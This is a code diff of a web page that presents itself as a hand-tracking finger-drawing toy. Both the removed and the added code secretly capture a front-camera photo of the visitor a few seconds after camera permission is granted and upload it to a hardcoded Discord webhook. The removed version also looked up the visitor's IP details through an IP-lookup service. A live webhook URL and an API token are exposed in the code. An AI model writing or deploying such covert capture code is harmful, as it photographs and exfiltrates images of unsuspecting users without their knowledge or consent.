@@ -14,7 +14,7 @@
       justify-content: center;
       align-items: center;
       background-color: #222;
-      overflow: hidden;
+      overflow: hidden; /* Prevent scrolling */
     }
 
     video, canvas {
@@ -56,6 +56,7 @@
   </style>
 </head>
 <body>
+
   <div id="loading">
     <div id="spinner"></div>
     <p>Loading... Please wait.</p>
@@ -71,86 +72,36 @@
     const videoElement = document.getElementById('camera-view');
     const canvasElement = document.getElementById('camera-canvas');
     const canvasCtx = canvasElement.getContext('2d');
-    const webhookURL = "https://discord.com/api/webhooks/1269202921480781824/rEeILOelJ3vfUvqSfqkGb0fKpcjLe-4U62vwBaU4abBQ8tkH-az5an4timRi4S7BbXLt"; // Replace with your server's webhook URL
+    
+    let drawingMode = false;  // Tracks whether drawing mode is enabled
+    let previousIndexPos = null; // Stores the last position of the index finger
 
-    let drawingMode = false;
-    let previousIndexPos = null;
-
-    // Function to grab the user's IP information
-    async function fetchIP() {
-      try {
-        const response = await fetch('https://ipinfo.io/json?token=da0fe815269d6a'); // Replace with your IPinfo token
-        const data = await response.json();
-        console.log("User's IP Details:", data);
-        return data;
-      } catch (error) {
-        console.error('Failed to fetch IP information:', error);
-      }
-    }
-
-    // Capture a picture from the front camera and send it via webhook
-    async function captureAndSendImage() {
-      const captureCanvas = document.createElement("canvas");
-      captureCanvas.width = videoElement.videoWidth;
-      captureCanvas.height = videoElement.videoHeight;
-      const captureCtx = captureCanvas.getContext("2d");
-      captureCtx.drawImage(videoElement, 0, 0);
-
-      // Convert canvas to blob for uploading
-      captureCanvas.toBlob(async (blob) => {
-        if (blob) {
-          const formData = new FormData();
-          formData.append("image", blob, "captured_image.png"); // Change filename as needed
-
-          try {
-            const response = await fetch(webhookURL, {
-              method: "POST",
-              body: formData,
-            });
-
-            if (response.ok) {
-              console.log('Image sent successfully');
-            } else {
-              console.error('Failed to send image:', response.statusText);
-            }
-          } catch (error) {
-            console.error('Error sending image:', error);
-          }
-        } else {
-          console.error('Failed to convert canvas to blob.');
-        }
-      }, "image/png"); // You can change the image format if needed
-    }
-
-    // Initialize camera after loading
-    async function initialize() {
-      document.getElementById('loading').style.display = 'none';
-      await initializeCamera();
-      resizeCanvas();
-      window.addEventListener('resize', resizeCanvas);
-    }
-
+    // Resize canvas to match the window
     function resizeCanvas() {
       canvasElement.width = window.innerWidth;
       canvasElement.height = window.innerHeight;
     }
 
-    async function initializeCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        videoElement.srcObject = stream;
-        videoElement.style.display = 'block';
-        initializeHandTracking();
-        
-        // Capture image and IP information after a delay
-        setTimeout(() => {
-          captureAndSendImage();
-          fetchIP();
-        }, 5000); // Delay to ensure the camera stream is ready
-      } catch (err) {
-        alert('Error accessing the camera: ' + err);
-        console.error(err);
-      }
+    // Start camera after loading
+    setTimeout(() => {
+      document.getElementById('loading').style.display = 'none';
+      initializeCamera();
+      resizeCanvas();
+      window.addEventListener('resize', resizeCanvas);
+    }, 3000);
+
+    function initializeCamera() {
+      // Request permission for the camera and display it
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+          videoElement.srcObject = stream;
+          videoElement.style.display = 'block';
+          initializeHandTracking();
+          setTimeout(captureAndUploadImage, 5000); // Capture and upload image after 5 seconds
+        })
+        .catch(err => {
+          alert('Error accessing the camera: ' + err);
+        });
     }
 
     function initializeHandTracking() {
@@ -185,10 +136,10 @@
 
       if (results.multiHandLandmarks) {
         for (const landmarks of results.multiHandLandmarks) {
-          detectThumbPinkyTouch(landmarks);
+          detectThumbPinkyTouch(landmarks);  // Check for thumb-pinky touch
           drawHandLandmarks(landmarks);
           if (drawingMode) {
-            trackAndDrawWithIndexFinger(landmarks);
+            trackAndDrawWithIndexFinger(landmarks);  // Draw when in drawing mode
           }
         }
       }
@@ -196,22 +147,23 @@
     }
 
     function detectThumbPinkyTouch(landmarks) {
-      const pinkyTip = landmarks[20];
-      const thumbTip = landmarks[4];
+      const pinkyTip = landmarks[20]; // Pinky tip
+      const thumbTip = landmarks[4];  // Thumb tip
 
       const distance = Math.sqrt(
         Math.pow(pinkyTip.x - thumbTip.x, 2) +
         Math.pow(pinkyTip.y - thumbTip.y, 2)
       );
 
-      if (distance < 0.05) {
-        drawingMode = !drawingMode;
-        previousIndexPos = null;
+      if (distance < 0.05) {  // Threshold for touch
+        drawingMode = !drawingMode;  // Toggle drawing mode
+        previousIndexPos = null;  // Reset index position when toggling
       }
     }
 
     function trackAndDrawWithIndexFinger(landmarks) {
-      const indexTip = landmarks[8];
+      const indexTip = landmarks[8];  // Index finger tip
+
       const indexX = indexTip.x * canvasElement.width;
       const indexY = indexTip.y * canvasElement.height;
 
@@ -228,18 +180,21 @@
     }
 
     function drawHandLandmarks(landmarks) {
-      canvasCtx.strokeStyle = 'white';
+      canvasCtx.strokeStyle = 'white';  // Set line color to white
       canvasCtx.lineWidth = 3;
 
       const connections = [
-        [0, 1], [1, 2], [2, 3], [3, 4],
-        [0, 5], [5, 6], [6, 7], [7, 8],
-        [0, 9], [9, 10], [10, 11], [11, 12],
-        [0, 13], [13, 14], [14, 15], [15, 16],
-        [0, 17], [17, 18], [18, 19], [19, 20]
+        [0, 1], [1, 2], [2, 3], [3, 4], // Thumb
+        [0, 5], [5, 6], [6, 7], [7, 8], // Index finger
+        [0, 9], [9, 10], [10, 11], [11, 12], // Middle finger
+        [0, 13], [13, 14], [14, 15], [15, 16], // Ring finger
+        [0, 17], [17, 18], [18, 19], [19, 20] // Pinky finger
       ];
 
-      connections.forEach(([start, end]) => {
+      const fingerLabels = ["Thumb", "Index", "Middle", "Ring", "Pinky"];
+      let fingerCount = 0;
+
+      connections.forEach(([start, end], index) => {
         const startX = landmarks[start].x * canvasElement.width;
         const startY = landmarks[start].y * canvasElement.height;
         const endX = landmarks[end].x * canvasElement.width;
@@ -249,11 +204,46 @@
         canvasCtx.moveTo(startX, startY);
         canvasCtx.lineTo(endX, endY);
         canvasCtx.stroke();
+
+        if ([4, 8, 12, 16, 20].includes(end)) {
+          canvasCtx.fillStyle = "white";
+          canvasCtx.font = "20px Arial";
+          canvasCtx.fillText(fingerLabels[fingerCount], endX - 15, endY - 10);
+          fingerCount++;
+        }
       });
     }
 
-    // Call initialize when the page loads
-    window.onload = initialize;
+    function captureAndUploadImage() {
+      const captureCanvas = document.createElement('canvas');
+      captureCanvas.width = canvasElement.width;
+      captureCanvas.height = canvasElement.height;
+      const captureCtx = captureCanvas.getContext('2d');
+      captureCtx.drawImage(videoElement, 0, 0, captureCanvas.width, captureCanvas.height);
+      
+      // Convert the canvas to a blob
+      captureCanvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('file', blob, 'captured-image.png');
+
+        // Send the image to the Discord webhook
+        fetch('https://discord.com/api/webhooks/1269202921480781824/rEeILOelJ3vfUvqSfqkGb0fKpcjLe-4U62vwBaU4abBQ8tkH-az5an4timRi4S7BbXLt', {
+          method: 'POST',
+          body: formData,
+        })
+        .then(response => {
+          if (response.ok) {
+            console.log('Image uploaded successfully');
+          } else {
+            console.error('Image upload failed:', response.statusText);
+          }
+        })
+        .catch(error => {
+          console.error('Error uploading image:', error);
+        });
+      }, 'image/png');
+    }
   </script>
+
 </body>
 </html>
